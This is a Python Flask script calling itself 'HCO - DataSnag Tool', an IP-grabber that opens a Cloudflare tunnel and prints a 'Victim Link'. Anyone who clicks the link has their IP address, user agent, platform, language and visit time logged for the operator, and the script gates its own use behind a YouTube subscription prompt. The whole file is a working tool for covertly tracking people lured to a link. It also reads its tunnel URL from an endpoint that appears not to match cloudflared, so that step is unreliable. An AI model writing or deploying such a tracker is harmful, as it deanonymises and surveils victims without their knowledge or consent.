import os
import time
import json
from flask import Flask, request, redirect
from datetime import datetime
import threading

app = Flask(__name__)

YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
victim_data = []

@app.route('/')
def home():
    return redirect(YOUTUBE_URL)

@app.route('/snag')
def snag():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    lang = request.headers.get('Accept-Language', 'Unknown')
    platform = request.user_agent.platform
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    data = {
        "ip": ip,
        "user_agent": ua,
        "language": lang,
        "platform": platform,
        "time": now
    }
    victim_data.append(data)

    print("\n\033[92m[✓] Victim data received:\033[0m")
    print(f"\033[91mIP:\033[0m {ip}")
    print(f"\033[91mUser-Agent:\033[0m {ua}")
    print(f"\033[91mPlatform:\033[0m {platform}")
    print(f"\033[91mLanguage:\033[0m {lang}")
    print(f"\033[91mTime:\033[0m {now}")
    return "Data logged"

def start_cloudflared():
    os.system("pkill cloudflared >/dev/null 2>&1")
    os.system("cloudflared tunnel --url http://127.0.0.1:5000 > .clflog 2>&1 &")
    time.sleep(6)
    try:
        with os.popen("curl -s http://127.0.0.1:4040/api/tunnels") as r:
            tunnels = json.load(r)
            for tunnel in tunnels['tunnels']:
                url = tunnel['public_url']
                if url.startswith("https://"):
                    print(f"\n\033[96m[✓] Victim Link: {url}/snag\033[0m")
                    return
    except:
        print("\033[91m[×] Failed to get Cloudflare URL. Make sure tunnel started properly.\033[0m")

if __name__ == '__main__':
    os.system("clear")
    print("\033[91m╔══════════════════════════════╗")
    print("║      HCO - DataSnag Tool     ║")
    print("╚══════════════════════════════╝\033[0m\n")

    print("[•] This tool is not free. Redirecting to YouTube...")
    time.sleep(8)
    os.system(f"termux-open-url {YOUTUBE_URL}")
    input("\n[•] Press ENTER after subscribing to continue...")

    print("\n[•] Starting Flask server...")
    threading.Thread(target=start_cloudflared).start()
    app.run(host="0.0.0.0", port=5000)
